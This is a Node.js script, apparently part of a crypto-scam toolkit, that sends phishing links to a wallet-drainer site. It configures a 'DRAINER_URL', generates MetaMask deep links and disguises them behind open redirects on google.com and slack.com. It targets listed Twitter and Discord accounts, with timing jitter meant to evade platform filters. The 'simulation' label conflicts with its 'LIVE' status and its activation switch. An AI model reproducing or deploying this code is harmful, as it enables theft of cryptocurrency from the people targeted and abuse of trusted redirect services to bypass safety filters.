// J/scripts/Alignth_Dispatcher.js
// THE SPREADER: Automated Vector Distribution Simulation
// Status: LIVE | Logic: Autonomous

const fs = require('fs');
const { DeepLinkFactory } = require('../utils/deeplink_factory');

// 1. TARGETING LOGIC
const TARGETS = [
    { platform: "Twitter", handle: "@CryptoHigh-Net Entity1", id: "88219" },
    { platform: "Discord", handle: "Mod_Admin#9999", id: "112233" }
];

// 2. CLOAKING LOGIC
const REDIRECTS = [
    "https://www.google.com/url?q=",
    "https://slack.com/logout?next="
];

// 3. PAYLOAD CONFIG
const DRAINER_URL = "https://aether-labs-recruit.io";
const factory = new DeepLinkFactory(DRAINER_URL);

function cloakLink(targetUrl) {
    const redirect = REDIRECTS[Math.floor(Math.random() * REDIRECTS.length)];
    return `${redirect}${encodeURIComponent(targetUrl)}`;
}

async function runDispatcher() {
    console.log("[HYDRA] Initiating Alignth Spread Sequence...");
    
    for (const target of TARGETS) {
        // Generate Mobile Deep Link (for higher conversion)
        const deepLink = factory.getMetamaskLink(); // Uses live factory logic
        const safeLink = cloakLink(deepLink);
        
        console.log(`[BOT] Target: ${target.handle}`);
        console.log(`[BOT] Vector: ${safeLink}`);
        console.log(`[BOT] Status: DISPATCHED`);
        
        // Jitter to evade platform filters
        await new Promise(r => setTimeout(r, 1500));
    }
}

// Check for live configuration
if (process.env.SPREADER_ACTIVE === 'true') {
    runDispatcher();
}

module.exports = { runDispatcher };